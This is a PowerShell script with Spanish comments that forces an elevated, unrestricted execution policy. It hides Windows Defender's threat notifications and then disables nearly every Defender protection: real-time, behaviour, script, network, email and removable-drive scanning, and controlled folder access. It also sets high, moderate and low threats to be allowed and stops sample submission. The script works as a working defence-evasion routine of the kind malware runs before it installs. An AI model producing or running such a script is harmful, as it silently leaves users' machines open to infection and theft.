# Intenta cambiar la política de ejecución sin confirmación
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process -Force

# Si no es posible, intenta requerir confirmación automática para 'All' (Opción 'A')
Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine -Force;`"" -Verb RunAs

# Desactiva las notificaciones de Windows Defender antes de realizar cambios
Set-MpPreference -UILockdown $true          # Desactiva las notificaciones de amenazas graves

# Desactivar la protección en tiempo real
Set-MpPreference -DisableRealtimeMonitoring $true

# Desactivar el monitoreo de comportamiento
Set-MpPreference -DisableBehaviorMonitoring $true

# Desactivar el escaneo de scripts
Set-MpPreference -DisableScriptScanning $true

# Desactivar la protección de red
Set-MpPreference -EnableNetworkProtection 0

# Desactivar la protección de carpetas controladas
Set-MpPreference -EnableControlledFolderAccess 0

# Desactivar la protección contra aplicaciones potencialmente no deseadas
Set-MpPreference -PUAProtection 0

# Desactivar el escaneo de dispositivos removibles
Set-MpPreference -DisableRemovableDriveScanning $true

# Desactivar el escaneo de archivos de red en escaneos completos
Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true

# Desactivar el escaneo de archivos de correo electrónico
Set-MpPreference -DisableEmailScanning $true

# Desactivar la protección IOAV
Set-MpPreference -DisableIOAVProtection $true

# Deshabilitar el uso del proxy exclusivamente
Set-MpPreference -ForceUseProxyOnly $false

# Configurar la acción predeterminada para amenazas graves a "Permitir" (Cuidado con esto)
Set-MpPreference -HighThreatDefaultAction 6  # 6 es generalmente para "Permitir", dependiendo del sistema puede variar

# Configurar la acción predeterminada para amenazas moderadas y bajas a "Permitir"
Set-MpPreference -ModerateThreatDefaultAction 6 -LowThreatDefaultAction 6

# Desactivar la recopilación de muestras
Set-MpPreference -SubmitSamplesConsent 0

# Guardar los cambios y reiniciar los servicios necesarios para que los cambios tengan efecto
Restart-Service WinDefend

